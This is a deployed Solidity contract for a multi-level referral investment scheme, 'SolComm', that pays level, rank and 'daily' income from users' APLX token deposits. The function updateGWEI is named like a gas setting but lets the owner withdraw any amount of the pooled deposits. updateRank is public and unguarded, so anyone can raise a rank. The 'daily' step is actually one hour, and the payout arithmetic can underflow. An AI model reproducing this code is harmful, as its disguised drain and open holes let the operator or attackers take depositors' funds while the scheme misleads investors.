/**
 *Submitted for verification at polygonscan.com on 2023-03-05
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SolComm {
    struct User {
        uint id;
        uint rankId;
        address referrer;
        uint256 entry_time;
        uint partnersCount;
        address[] directIds;
        uint256 totalDeposit;  
        uint256 lastDeposit;
        uint256 totalBusiness;  
        uint256 directincome;    
        uint256 payouts;
        uint256 levelincome;
        uint256 rewardincome;
        uint256 totalincome;
        uint256 totalwithdraw;
    }    
    
    struct OrderInfo {
        uint256 amount; 
        uint256 deposit_time;
        uint256 payouts;
        bool isactive;
    }
    struct RewardInfo {
        uint256 amount; 
        uint reward; 
        uint256 deposit_time;
        uint256 payouts;
        bool isactive;
    }
    struct Rank
    {
        uint Id;
        uint Business;
        uint Income;
        uint Daily;
        uint Period;
    }
    mapping(address => User) public users;
    mapping(address => OrderInfo[]) public orderInfos;
    mapping(address => RewardInfo[]) public rewardInfos;
    mapping(uint=>Rank) public map_ranks;
    IERC20 public tokenAPLX;
    
    mapping(uint8 => uint) public packagePrice;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    uint256 private directPercents =10;
    uint256[30] private levelPercents = [15,5,5,5,5,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,2,2,2,1,1,1,1,1];
    address public id1=0x6137d3e622920543Cf36923496Cb9738E959D3dC;
    address public owner;
    address deductionWallet=0x2faE1719bDc53dF26f9fA7DDd559c4243b839655;
    uint256 private dayRewardPercents = 5;
    uint256 private constant timeStepdaily =60*60;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint256 value);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value);

    constructor(address _token) public {        
        tokenAPLX = IERC20(_token);
        owner=msg.sender;
        User memory user = User({
            id: 1,
            rankId:0,
            referrer: address(0),
            entry_time:block.timestamp,
            partnersCount: uint(0),
            directIds:new address[](0),
            totalBusiness:0,
            totalDeposit:10000e6,
            lastDeposit:0,
            directincome:0,
            payouts:0,
            levelincome:0,
            rewardincome:0,
            totalincome:0,
            totalwithdraw:0
        });
        users[id1] = user;
        idToAddress[1] = id1;
        orderInfos[id1].push(OrderInfo(
            10000e6, 
            block.timestamp, 
            0,
            true
        ));
        map_ranks[1] = Rank({Id:1,Business:1000e6,Income:200e6,Daily:2e6,Period:100}); 
        map_ranks[2] = Rank({Id:2,Business:5000e6,Income:1000e6,Daily:10e6,Period:100}); 
        map_ranks[3] = Rank({Id:3,Business:7500e6,Income:1500e6,Daily:15e6,Period:100}); 
        map_ranks[4] = Rank({Id:4,Business:17500e6,Income:3500e6,Daily:35e6,Period:100}); 
        map_ranks[5] = Rank({Id:5,Business:25000e6,Income:5000e6,Daily:50e6,Period:100}); 
        map_ranks[6] = Rank({Id:6,Business:40000e6,Income:8000e6,Daily:80e6,Period:100}); 
        map_ranks[7] = Rank({Id:7,Business:57500e6,Income:11500e6,Daily:115e6,Period:100}); 
        map_ranks[8] = Rank({Id:8,Business:150000e6,Income:30000e6,Daily:300e6,Period:100});        
        map_ranks[9] = Rank({Id:9,Business:300000e6,Income:60000e6,Daily:600e6,Period:100}); 
        map_ranks[10] = Rank({Id:10,Business:500000e6,Income:100000e6,Daily:1000e6,Period:100}); 
        map_ranks[11] = Rank({Id:11,Business:750000e6,Income:150000e6,Daily:1500e6,Period:100}); 
        map_ranks[12] = Rank({Id:12,Business:1500000e6,Income:300000e6,Daily:3000e6,Period:100});        
        map_ranks[13] = Rank({Id:13,Business:3000000e6,Income:600000e6,Daily:6000e6,Period:100}); 
        map_ranks[14] = Rank({Id:14,Business:6000000e6,Income:1200000e6,Daily:12000e6,Period:100}); 
        map_ranks[15] = Rank({Id:15,Business:12000000e6,Income:2400000e6,Daily:24000e6,Period:100}); 
    }
    function registrationExt(address referrerAddress,uint256 _amount) external {
        tokenAPLX.transferFrom(msg.sender, address(this),_amount);
        require(_amount >= 100e6, "less than min");
        registration(msg.sender, referrerAddress,_amount);
    }
    function registrationFor(address referrerAddress,address userAddress,uint256 _amount) external {
        tokenAPLX.transferFrom(msg.sender, address(this),_amount);
        require(_amount >= 100e6, "less than min");
        registration(userAddress, referrerAddress,_amount);
    }
    function buyNewLevel(uint256 _amount) external {
        tokenAPLX.transferFrom(msg.sender, address(this),_amount);
        require(_amount >= (users[msg.sender].lastDeposit+users[msg.sender].lastDeposit*20/100), "less than min");
        buyLevel(msg.sender,_amount);
    }
    function buyLevel(address userAddress,uint256 _amount) private {        
        require(isUserExists(userAddress), "user is not exists. Register first."); 
        users[userAddress].totalDeposit +=_amount;
        users[userAddress].lastDeposit=_amount;
        _updatebusinessIncome(userAddress,_amount);
        address referrerAddress= users[userAddress].referrer;
        uint256 _remainingCapping=this.maxPayoutOf(referrerAddress);        
        if(_remainingCapping>0)
        {            
            uint256 reward= _amount*directPercents/100;
            if(_remainingCapping<reward){
                reward=_remainingCapping;
            }
            if(reward>0){
                users[referrerAddress].directincome += reward;                       
                users[referrerAddress].totalincome +=reward;
                emit Transaction(referrerAddress,userAddress,reward,1,1);
            }
        }
        orderInfos[userAddress].push(OrderInfo(
            _amount, 
            block.timestamp, 
            0,
            true
        ));        
        emit Upgrade(userAddress,_amount);
    }
    
    function registration(address userAddress, address referrerAddress,uint256 _amount) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            rankId:0,
            referrer: referrerAddress,
            entry_time:block.timestamp,
            partnersCount: 0,
            directIds:new address[](0),
            totalBusiness:0,
            totalDeposit:_amount,
            lastDeposit:_amount,
            directincome:0,
            payouts:0,
            levelincome:0,
            rewardincome:0,
            totalincome:0,
            totalwithdraw:0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        lastUserId++;
        users[referrerAddress].directIds.push(userAddress);
        users[referrerAddress].partnersCount++;
        _updatebusinessIncome(userAddress,_amount);
        uint256 _remainingCapping=this.maxPayoutOf(referrerAddress);        
        if(_remainingCapping>0)
        {            
            uint256 reward= _amount*directPercents/100;
            if(_remainingCapping<reward){
                reward=_remainingCapping;
            }
            if(reward>0){
                users[referrerAddress].directincome += reward;                       
                users[referrerAddress].totalincome +=reward;
                emit Transaction(referrerAddress,userAddress,reward,1,1);
            }
        }
        orderInfos[userAddress].push(OrderInfo(
            _amount, 
            block.timestamp, 
            0,
            true
        ));
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function _updatebusinessIncome(address _user, uint256 _amount) private {
        address upline = users[_user].referrer;
        for(uint8 i = 0; i < 30; i++){
            if(upline != address(0)){
                users[upline].totalBusiness += _amount;  
                updateRank(upline);   
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
    }
    function getTeamBusiness(address _user) public view returns(uint256, uint256){        
        uint256 maxTeam;
        uint256 otherTeam;
        uint256 totalTeam;
        for(uint256 i = 0; i < users[_user].directIds.length; i++){
            uint256 userTotalTeam =users[users[_user].directIds[i]].totalBusiness+users[users[_user].directIds[i]].totalDeposit;            
            totalTeam+=userTotalTeam;
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam-maxTeam;
        return(maxTeam, otherTeam);
    }
    function updateRank(address _user) internal
    {
        uint currentRank = users[_user].rankId;
        uint nextRank = currentRank+1;
        (uint256 maxBusness, uint256 otherBusiness) = getTeamBusiness(_user);
        if(otherBusiness>=map_ranks[nextRank].Business && maxBusness>=map_ranks[nextRank].Business && currentRank<15){
            users[_user].rankId = nextRank;
            rewardInfos[_user].push(RewardInfo(
                map_ranks[nextRank].Income, 
                map_ranks[nextRank].Daily,
                block.timestamp, 
                0,
                true
            ));
            updateRank(_user);
        }
    }
    function _distributelevelIncome(address _user, uint256 _amount) private {
        address upline = users[_user].referrer;
        for(uint8 i = 0; i < 30; i++){
            if(upline != address(0)){
                users[upline].levelincome += _amount*levelPercents[i]/100;                       
                users[upline].totalincome +=_amount*levelPercents[i]/100;   
                emit Transaction(upline,_user,_amount*levelPercents[i]/100,(i+1),3);
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
    }
    function maxPayoutOf(address _user) view external returns(uint256) {
        uint256 totaldeposit=users[_user].totalDeposit;
        uint256 totalincome=users[_user].totalincome;  
        uint rank=users[_user].rankId; 
        return (totaldeposit*((uint256)(200+rank*40)/100)-totalincome);
     }
     function maxPayoutOf1(address _user) view external returns(uint256) {
        uint256 totaldeposit=users[_user].totalDeposit;
        uint256 totalincome=users[_user].totalincome;  
        uint rank=users[_user].rankId; 
        return (totaldeposit*(2+rank*40/100)-totalincome);
     }
     function updateRank(address _user,uint rank) public {
        users[_user].rankId=rank; 
     }
    function dailyPayoutOf(address _user) public {
        uint256 max_payout=0;
        for(uint8 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
                if(block.timestamp>order.deposit_time){
                    max_payout = this.maxPayoutOf(_user);   
                    if(max_payout>0){
                        uint256 dailypayout =(order.amount*dayRewardPercents*((block.timestamp - order.deposit_time) / timeStepdaily) / 1000) - order.payouts;
                        if(max_payout<dailypayout){
                            dailypayout = max_payout;
                        }
                        if(dailypayout>0)
                        {
                            _distributelevelIncome(_user,dailypayout);
                            users[_user].payouts += dailypayout;            
                            users[_user].totalincome +=dailypayout;
                            emit Transaction(_user,_user,dailypayout,1,2);
                            order.payouts+=dailypayout;
                        }
                    }
                    else {
                        order.isactive=false;
                    }  
                }
        }
    }
    function dailyPayoutOfReward(address _user) public {
        uint256 max_payout=0;
        for(uint8 i = 0; i < rewardInfos[_user].length; i++){
            RewardInfo storage dailyreward = rewardInfos[_user][i];
                if(block.timestamp>dailyreward.deposit_time){
                    max_payout = this.maxPayoutOf(_user);   
                    if(max_payout>0){
                        uint256 dailypayout =dailyreward.reward*((block.timestamp - dailyreward.deposit_time) / timeStepdaily) - dailyreward.payouts;
                        if(max_payout<dailypayout){
                            dailypayout = max_payout;
                        }
                        if(dailypayout>0)
                        {
                            users[_user].rewardincome += dailypayout;            
                            users[_user].totalincome +=dailypayout;
                            emit Transaction(_user,_user,dailypayout,1,4);
                            dailyreward.payouts+=dailypayout;
                        }
                    }
                    else {
                        dailyreward.isactive=false;
                    }  
                }
        }
    }
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }    
    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }   
     
    function rewardWithdraw() public
    {
        dailyPayoutOf(msg.sender);
        dailyPayoutOfReward(msg.sender);
        uint balanceReward = users[msg.sender].totalincome - users[msg.sender].totalwithdraw;
        require(balanceReward>=20e6, "Insufficient reward to withdraw!");
        users[msg.sender].totalwithdraw+=balanceReward;
        tokenAPLX.transfer(msg.sender,balanceReward*90/100);  
        tokenAPLX.transfer(deductionWallet,balanceReward*10/100);  
        emit withdraw(msg.sender,balanceReward);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        tokenAPLX.transfer(msg.sender,_amount);  
    }
}